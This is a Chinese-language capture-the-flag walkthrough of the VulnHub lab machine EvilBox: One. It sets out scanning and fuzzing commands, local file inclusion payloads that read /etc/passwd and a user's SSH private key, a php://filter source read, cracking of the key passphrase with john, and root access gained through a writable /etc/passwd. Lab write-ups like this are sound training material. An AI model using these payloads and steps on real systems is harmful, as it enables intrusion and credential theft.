# 打靶-EVILBOX: ONE

<div class="has-toc have-toc">
</div>

## 0x00 准备工作

靶机地址: <a href="https://www.vulnhub.com/entry/evilbox-one,736/" target="_blank"  rel="nofollow" ></a><a href="https://www.vulnhub.com/entry/evilbox-one,736/" target="_blank"  rel="nofollow" >https://www.vulnhub.com/entry/evilbox-one,736/</a>  
难度等级: 高  
打靶目标: 取得 root 权限

涉及攻击方法:

主机发现

端口扫描

强制方法

参数爆破

文件包含

PHP封装器

任意文件读取

SSH公钥登录

离线密码破解

系统权限漏洞利用

## 0x01 信息搜集

使用`fping -gaq 192.168.92.0/24`发现主机，-g通过指定开始和结束地址来生成目标列表或者一个IP/掩码形式，-a显示可ping通的目标，-q安静模式(不显示每个目标或每个ping的结果)。<figure class="wp-block-image size-full is-resized">

<img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2022/01/图片-73.png" alt="" class="wp-image-4922" width="566" height="111" /> </figure> 

然后使用nmap扫描端口，-A综合扫描，发现22和80端口及详细信息。<figure class="wp-block-image size-full">

<img loading="lazy" width="1974" height="1010" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2022/01/图片-74.png" alt="" class="wp-image-4924" /> </figure> 

80端口为Apache默认界面，没有信息。<figure class="wp-block-image size-full is-resized">

<img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2022/01/图片-75.png" alt="" class="wp-image-4925" width="684" height="237" /> </figure> 

手动访问robots.txt后发现一个可疑昵称，多次尝试后无果。<figure class="wp-block-image size-full is-resized">

<img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2022/01/图片-76.png" alt="" class="wp-image-4927" width="372" height="86" /> </figure> 

使用`gobuster dir -u http://192.168.92.130 -w /usr/share/seclists/Discovery/Web-Content/directory-list-1.0.txt -x txt,php,html,jsp`命令爆破目录，发现存在secret目录。<figure class="wp-block-image size-full">

<img loading="lazy" width="2255" height="834" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2022/01/图片-77.png" alt="" class="wp-image-4929" /> </figure> 

打开后没有任何信息，尝试进一步对secret目录进行爆破，发现evil.php。<figure class="wp-block-image size-full">

<img loading="lazy" width="2267" height="799" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2022/01/图片-78.png" alt="" class="wp-image-4930" /> </figure> 

然后使用`ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt:PARAM -w val.txt:VAL -u http://192.168.92.130/secret/evil.php?PARAM=VAL -fs 0`进行参数爆破，-fs 0是忽略空结果。但是没有爆破出任何结果。<figure class="wp-block-image size-full">

<img loading="lazy" width="2268" height="919" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2022/01/图片-79.png" alt="" class="wp-image-4933" /> </figure> 

下面尝试文件包含漏洞，使用`ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -u http://192.168.92.130/secret/evil.php?FUZZ=../index.html -fs 0`发现回显有command参数。<figure class="wp-block-image size-full">

<img loading="lazy" width="2270" height="911" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2022/01/图片-80.png" alt="" class="wp-image-4934" /> </figure> 

尝试访问passwd文件，发现最后存在一个mowree用户。<figure class="wp-block-image size-full">

<img loading="lazy" width="3436" height="373" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2022/01/图片-81.png" alt="" class="wp-image-4935" /> </figure> 

## 0x02 flag1

尝试后，发现只存在本地文件包含，使用php://filter封装器来读取源码，构造`command=php://filter/convert.base64-encode/resource=evil.php`<figure class="wp-block-image size-full">

<img loading="lazy" width="1909" height="192" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2022/01/图片-82.png" alt="" class="wp-image-4937" /> </figure> 

解码后得到

<pre class="wp-block-code"><code>&lt;?php
    $filename = $_GET&#91;'command'];
    include($filename);
?></code></pre>

构造`command=php://filter/write=convert.base64-decode/resource=test.txt&txt=MTIz`，其中txt=MTIz，MTIz是123使用base64加密后的内容。将此内容写入test.txt。尝试失败，没有写权限。

查看目标靶机支持的ssh认证类型`ssh root@192.168.92.130 -v`，-v就是以调试方式查看。可以看到目标系统支持公钥认证和密码认证。<figure class="wp-block-image size-full">

<img loading="lazy" width="1163" height="419" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2022/01/图片-83.png" alt="" class="wp-image-4939" /> </figure> 

构造`command=../../../../../../home/mowree/.ssh`，查看mowree的公钥。<figure class="wp-block-image size-full">

<img loading="lazy" width="3440" height="236" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2022/01/图片-84.png" alt="" class="wp-image-4940" /> </figure> 

查看私钥，构造`command=../../../../../../../../../home/mowree/.ssh/id_rsa`<figure class="wp-block-image size-full">

<img loading="lazy" width="1364" height="289" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2022/01/图片-85.png" alt="" class="wp-image-4941" /> </figure> 

把内容复制到本地，再通过`chmod 600 id_rsa`使权限没那么松散。最后使用`ssh mowree@192.168.92.130 -i id_rsa`密钥登录，结果需要私钥的密码。<figure class="wp-block-image size-full">

<img loading="lazy" width="927" height="67" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2022/01/图片-86.png" alt="" class="wp-image-4942" /> </figure> 

使用`python2 /usr/share/john/ssh2john.py ~/id_rsa > ~/hash`命令，将id_rsa转换成john能识别的hash格式。

将超级大字典rockyou复制过来，`cp /usr/share/wordlists/rockyou.txt .`，然后开始爆破`john hash --wordlist=rockyou.txt`，成功爆破出密码为`unicorn`<figure class="wp-block-image size-full">

<img loading="lazy" width="1566" height="349" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2022/01/图片-87.png" alt="" class="wp-image-4943" /> </figure> 

成功登录<figure class="wp-block-image size-full">

<img loading="lazy" width="1480" height="136" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2022/01/图片-88.png" alt="" class="wp-image-4944" /> </figure> 

查看flag1<figure class="wp-block-image size-full">

<img loading="lazy" width="632" height="140" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2022/01/图片-89.png" alt="" class="wp-image-4946" /> </figure> 

## 0x03 flag2

`fifind / -writable 2>/dev/null|grep -v 'proc|run|sys'`，查看可写权限的文件，发现了`etc/passwd`文件。<figure class="wp-block-image size-full is-resized">

<img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2022/01/图片-90.png" alt="" class="wp-image-4948" width="378" height="219" /> </figure> 

可以通过直接修改root用户名的密码了，使用`openssl passwd -1`命令，使用openssl加密算法来加密，输入的内容。

输入密码为han，返回了加密后的内容为`$1$JPKeenWm$HWPSn4QyyNd4vj8Kn4uTT.`<figure class="wp-block-image size-full is-resized">

<img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2022/01/图片-91.png" alt="" class="wp-image-4949" width="415" height="91" /> </figure> 

修改/etc/passwd。<figure class="wp-block-image size-full is-resized">

<img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2022/01/图片-92.png" alt="" class="wp-image-4950" width="744" height="142" /> </figure> 

然后切换到root用户。<figure class="wp-block-image size-full is-resized">

<img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2022/01/图片-93.png" alt="" class="wp-image-4951" width="424" height="302" /> </figure>
